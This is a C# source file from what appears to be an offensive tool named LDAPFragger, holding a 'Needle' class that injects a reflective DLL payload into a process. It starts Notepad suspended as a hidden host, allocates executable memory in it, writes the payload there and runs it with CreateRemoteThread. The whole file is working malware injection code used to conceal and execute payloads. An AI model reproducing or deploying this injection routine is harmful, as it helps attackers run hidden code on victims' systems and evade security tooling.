using System;
using System.Runtime.InteropServices;

// thx: http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread

namespace LDAPFragger.Core
{
    class Needle : MarshalByRefObject
    {

        #region structs

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        #endregion

        #region DLLImports
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
                                 bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo,
                                 out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
                     IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int CloseHandle(IntPtr hObject);

        #endregion

        // privileges
        const int PROCESS_CREATE_THREAD     = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION      = 0x0008;
        const int PROCESS_VM_WRITE          = 0x0020;
        const int PROCESS_VM_READ           = 0x0010;


        // used for memory allocation
        const uint MEM_COMMIT             = 0x00001000;
        const uint MEM_RESERVE            = 0x00002000;
        const uint PAGE_READWRITE         = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;           

        /// <summary>
        /// Inject unmanaged dll into a remote process
        /// </summary>
        /// <param name="reflectiveDLL"></param>
        public static void InjectRemote(byte[] reflectiveDLL, int pid = -1)
        {
            PROCESS_INFORMATION procInfo = loadPlaceholder();

            // geting the handle of the process - with required privileges
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, procInfo.dwProcessId);

            // allocate memory
            IntPtr remote_pointer = VirtualAllocEx(procHandle, IntPtr.Zero, Convert.ToUInt32(reflectiveDLL.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // write dll to remote process
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, remote_pointer, reflectiveDLL, Convert.ToUInt32(reflectiveDLL.Length), out bytesWritten);

            // start remote thread
            IntPtr res = CreateRemoteThread(procHandle, IntPtr.Zero, 0, remote_pointer, IntPtr.Zero, 0, IntPtr.Zero);

            CloseHandle(procHandle);
            CloseHandle(res);

            Misc.WriteGood(string.Format("Payload injected into process with PID: {0}", procInfo.dwProcessId));
            //Console.WriteLine("[+] Payload injected into process with PID: {0}", procInfo.dwProcessId);
        }

        /// <summary>
        /// Method to load , makes it hidden and returns the pid
        /// </summary>
        /// <param name="x86"></param>
        /// <returns></returns>
        private static PROCESS_INFORMATION loadPlaceholder()
        {

            /*
            Process p = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo(notepad);
            processStartInfo.WindowStyle      = ProcessWindowStyle.Hidden;
            processStartInfo.CreateNoWindow   = true;
            processStartInfo.UseShellExecute  = false;
            p.StartInfo = processStartInfo;
            p.Start();
            pid = p.Id;
            */

            //const uint NORMAL_PRIORITY_CLASS = 0x0020;
            const uint CREATE_SUSPENDED = 0x00000004;

            bool retValue;
            string Application        = Environment.GetEnvironmentVariable("windir") + @"\Notepad.exe";
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFO sInfo         = new STARTUPINFO();
            SECURITY_ATTRIBUTES pSec  = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec  = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            //Open Notepad
            retValue = CreateProcess(Application, null, ref pSec, ref tSec, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);                    

            return pInfo;
            
            //return thread;
        }

    }
}


